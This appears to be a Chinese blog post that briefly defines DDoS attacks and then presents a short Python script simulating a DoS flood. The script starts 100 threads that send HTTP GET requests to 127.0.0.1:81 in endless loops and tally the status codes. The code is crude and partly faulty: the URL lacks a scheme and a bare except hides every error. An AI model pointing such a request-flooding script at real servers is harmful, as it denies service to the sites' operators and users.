---
title: 简单的dos
date: 2021-09-19 13:44:17
tags: [多线程请求,python]
categories: [后端,python]
---

## DDos介绍

### 定义

分布式拒绝服务（Distributed Denial of Service）攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动dos攻击，从而成倍地提高拒绝服务攻击的威力。通常该攻击方式利用目标系统网络服务功能缺陷或者直接消耗其系统资源，使得该目标系统无法提供正常的服务。


## 使用python模拟点对点的攻击

### 思路：

利用多线程的无限循环发起请求，统计结果以及抛出502错误

1. 创建类继承多线程
2. 使用init封装url
3. run方法传入url，以及错误处理
4. 统计数据和主方法启动

### 测试代码：

```python
# -*- coding = utf-8 -*-
# @Time : 2021/9/19 13:45
# @Author : FSAN
# @File : sendHttpRequest.py
# @Software : PyCharm


from threading import Thread
from requests import get

status = {"200": 0, "404": 0, "500": 0}


class sendHtpp(Thread):
    def __init__(self, HOST, PORT):
        global status
        self.url = f"{HOST}:{PORT}"
        super().__init__()

    def run(self) -> None:
        while True:
            sendHtpp.START(self.url)

    def START(url):
        try:
            resp = get(url).status_code
            status[str(resp)] += 1
            print(status)
        except:
            pass


if __name__ == '__main__':
    for i in range(100):
        s = sendHtpp("127.0.0.1", 81)
        s.start()
    s.join()
```

